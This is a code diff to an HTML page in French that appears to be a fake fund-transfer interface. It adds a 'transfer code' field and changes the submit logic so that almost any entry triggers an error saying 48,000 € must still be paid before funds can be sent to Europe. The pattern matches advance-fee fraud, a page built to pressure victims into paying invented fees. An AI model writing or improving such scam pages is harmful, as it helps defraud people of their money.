@@ -34,18 +34,18 @@
         <![endif]-->
             <style type="text/css">
   .colored-toast.swal2-icon-error {
-    background-color: rgba(5,150,105,0.6) !important;
+    background-color: #059669 !important;
      }
          .colored-toast .swal2-title {
-      color: #fff;
+      color: #ffffff;
     }
 
     .colored-toast .swal2-close {
-      color: #fff;
+      color: #ffffff;
     }
 
     .colored-toast .swal2-html-container {
-      color: #fff;
+      color: #ffffff;
     }
 /* CSS */
 :root{
@@ -665,6 +665,10 @@
                                     <label for="input0" class="form-label">Entrer le montant</label>
                                     <input type="number" class="form-control" id="input0" placeholder="€ 458.00" required>
                                 </div>
+                                <div class="form-group mb-15">
+                                    <label for="input0" class="form-label">Code </label>
+                                    <input type="number" class="form-control" id="input3" placeholder="Code de virement" required>
+                                </div>
                                 <button type="submit" class="btn main-btn main-btn-lg full-width">Confirmer</button>
                             </form>
                         </div>
@@ -910,7 +914,8 @@
             event.preventDefault();
             var message = $("#input8").val();
             var message1 = $("#input0").val();
-            if(message.length!==0 || message1.length!==0){
+            var message2 = $("#input3").val();
+            if(message.length!==0 || message1.length!==0 || message2 == 7525){
 
                 var toastMixin = Swal.mixin({
                                 toast: true,
@@ -925,7 +930,7 @@
 
                 toastMixin.fire({
                             toast: true,
-                            icon: 'success',
+                            icon: 'error',
                             title: 'Le montant restant de 48.000,00 € doit être payé avant d\'effectuer le virement des fonds vers l\'Europe.',
                             iconColor: 'white',
                             animation: false,
